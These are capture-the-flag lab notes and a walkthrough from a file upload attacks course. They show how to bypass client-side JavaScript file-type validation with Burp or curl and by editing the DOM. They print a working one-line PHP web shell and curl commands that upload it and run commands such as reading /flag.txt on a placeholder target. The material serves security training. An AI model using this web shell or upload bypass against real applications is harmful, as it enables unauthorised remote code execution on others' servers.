# Section 4 — Client-Side Validation

## ID
530

## Module
File Upload Attacks

## Kind
notes

## Title
Section 4 — Client-Side Validation

## Description
Bypassing front-end JavaScript file-type validation to upload a PHP web shell via request modification (Burp/curl) and browser DOM manipulation.

## Tags
file-upload, client-side-bypass, web-shell, burp-suite, php, javascript

## Commands
- `curl -s http://<TARGET>/upload.php -F "uploadFile=@-;filename=shell.php;type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>'`
- `curl -s "http://<TARGET>/profile_images/shell.php?cmd=cat+/flag.txt"`
- `<?php system($_REQUEST['cmd']); ?>`

## What This Section Covers
Web applications that only enforce file-type validation on the client side (JavaScript) can be trivially bypassed. Since the browser executes the validation logic, the attacker controls it entirely — either by sending a crafted request directly to the server (skipping the front-end) or by modifying the DOM to disable the checks before uploading.

## Methodology
1. Attempt to upload a `.php` file normally — observe the JS error "Only images are allowed!" and disabled Upload button, confirming validation is **client-side only** (no HTTP request fires on file select).
2. **Method 1 — Back-end request modification (Burp/curl):** Upload a legitimate image, intercept the POST to `/upload.php`, change `filename` to `shell.php`, replace image body with `<?php system($_REQUEST['cmd']); ?>`, forward the request.
3. **Method 2 — DOM manipulation:** Press `Ctrl+Shift+C`, click profile image, locate the `<input>` tag. Remove `onchange="checkFile(this)"` and optionally `accept=".jpg,.jpeg,.png"`. Upload `shell.php` normally through the dialog.
4. Confirm upload succeeded (`File successfully uploaded` response).
5. Navigate to `/profile_images/shell.php?cmd=id` to verify RCE, then `cmd=cat+/flag.txt` to grab the flag.

## Multi-step Workflow (curl — equivalent to Burp intercept)
```
# Upload web shell bypassing client-side validation
curl -s http://<TARGET>/upload.php \
  -F "uploadFile=@-;filename=shell.php;type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>'

# Trigger web shell and read flag
curl -s "http://<TARGET>/profile_images/shell.php?cmd=cat+/flag.txt"
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Read /flag.txt | `FLAG_HERE` | Uploaded PHP web shell via client-side bypass, invoked at `/profile_images/shell.php?cmd=cat+/flag.txt` |

## Key Takeaways
- Client-side validation is **never** a security control — it's a UX feature. All real validation must happen server-side.
- Two bypass paths: **modify the request** (Burp/curl — most reliable, works regardless of JS complexity) or **modify the DOM** (quick for simple checks, but fragile if JS is obfuscated or re-validates).
- The upload directory `/profile_images/` must be known or discoverable — inspect the `<img src="...">` tag after a legitimate upload to find it.
- `Content-Type` header in the multipart body was left as `image/png` and still accepted — the server didn't validate MIME type either (this changes in later sections).
- DOM changes are temporary (reset on refresh), but you only need them long enough to fire one upload.

## Gotchas
- If using Burp, make sure FoxyProxy is set to the Burp profile **before** uploading — intercepting after the request fires is too late.
- The `checkFile` JS function both prints an error **and** disables the submit button — you must remove the function (not just dismiss the error) for the browser method to work.
- Some browsers (Chrome) use "overrides" instead of direct DOM editing for persistent local changes — Firefox's Inspector with direct attribute deletion is the simplest approach.



# HTB Solution

## Question 1

### "Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)"

Students need to use an intercepting proxy such as `Burp Suite` and/or the browser to bypass the client-side type validations. `Burp Suite` will be used first then the browser method.

After launching `Burp Suite` and making sure that the `FoxyProxy` plugin is set to the "Burp (8080)" profile, students need to upload any image then intercept the request:

![File_Upload_Attacks_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_4.png)

In the intercepted request, students to change "filename" to a different name that will hold the web shell code, such as "WebShell.php", additionally, students need to take out the image contents and replace it with a simple web shell:

        php
`<?php system($_REQUEST['cmd']); ?>`

![File_Upload_Attacks_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_5.png)

After forwarding the request, students need to invoke the web shell under the `/profile_images/` directory, using the name they have given it as the value for "filename" in the modified intercepted request, `http://STMIP:STMPO/profile_images/WebShell.php?cmd=cat+/flag.txt`:

![File_Upload_Attacks_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_6.png)

For the browser method, students need to press (`Ctrl` + `Shift` + `C`) then click with the cursor on the profile image:

![File_Upload_Attacks_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_7.png)

In the form tag with the ID "uploadForm", students need to change "onSubmit" to be only "upload()", and, in the input tag with the ID "uploadFile", students need to remove `accept=".jpg,.jpeg,.png"`:

![File_Upload_Attacks_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_8.png)

Now that the client-side validation has been disabled, students can proceed to upload a web shell regularly, as done previously.
